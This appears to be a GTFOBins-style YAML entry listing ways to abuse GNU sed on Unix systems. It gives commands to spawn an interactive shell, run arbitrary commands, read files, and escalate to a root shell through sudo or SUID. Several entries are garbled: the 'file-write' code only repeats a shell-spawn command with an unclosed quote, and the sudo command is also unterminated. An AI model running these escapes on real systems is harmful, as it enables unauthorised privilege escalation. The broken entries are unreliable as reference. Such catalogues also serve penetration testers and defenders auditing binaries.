---
functions:
  execute-interactive:
    - description: GNU version only. Also, this requires `bash`.
      code: sed -n '1e exec sh 1>&0' /etc/hosts
  execute-non-interactive:
    - description: GNU version only.
      code: sed -n "1e id" /etc/hosts
  file-write:
    - code: |
        LFILE=file_to_write
        sed -n '1e exec sh 1>&0 /etc/hosts
  file-read:
    - code: |
        LFILE=file_to_read
        sed '' "$LFILE"
  suid-enabled:
    - code: |
        LFILE=file_to_read
        ./sed -e '' "$LFILE"
  sudo-enabled:
    - description: GNU version only. Also, this requires `bash`.
      code: sudo sed -n '1e exec sh 1>&0 /etc/hosts
---
